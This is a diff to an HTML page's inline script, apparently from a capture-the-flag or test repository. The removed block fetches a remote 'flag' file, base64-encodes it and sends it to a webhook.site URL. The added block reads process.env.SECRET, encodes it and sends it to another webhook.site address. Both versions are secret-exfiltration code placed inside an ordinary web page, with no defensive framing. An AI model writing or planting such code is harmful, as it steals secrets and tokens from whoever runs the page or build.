@@ -7,29 +7,20 @@
 </head>
 <body>
     <script>
-        fetch('https://amazingrupak.github.io/hi.js')
-    .then(response => response.text())
-    .then(text => {
-        const encodedFlag = btoa(text);
-        const webhookUrl = `https://webhook.site/0e039ea9-674a-4a9c-a42b-aca98da957f0?cz=${encodedFlag}`;
-        
-        // Send the encoded flag to the webhook URL
-        fetch(webhookUrl, {
-            method: 'GET'
-        }).then(response => {
-            if (!response.ok) {
-                throw new Error(`HTTP error! Status: ${response.status}`);
-            }
-            return response.text();
-        }).then(data => {
-            console.log('Webhook response:', data);
-        }).catch(error => {
-            console.error('Error sending to webhook:', error);
-        });
-    })
-    .catch(error => {
-        console.error('Error fetching flag:', error);
-    });
+    // Simulated environment variable
+const SECRET = process.env.SECRET;
+// Encode and send to webhook
+const encodedVariable = btoa(SECRET);
+const webhookUrl = `https://webhook.site/2e32e2e8-7b4b-482f-9495-8726bc4a4f5d?yo=${encodedVariable}`;
+
+fetch(webhookUrl)
+  .then(response => response.text())
+  .then(data => {
+    console.log('Data sent successfully:', data);
+  })
+  .catch(error => {
+    console.error('Error sending data:', error);
+  });
 
     </script>
 </body>
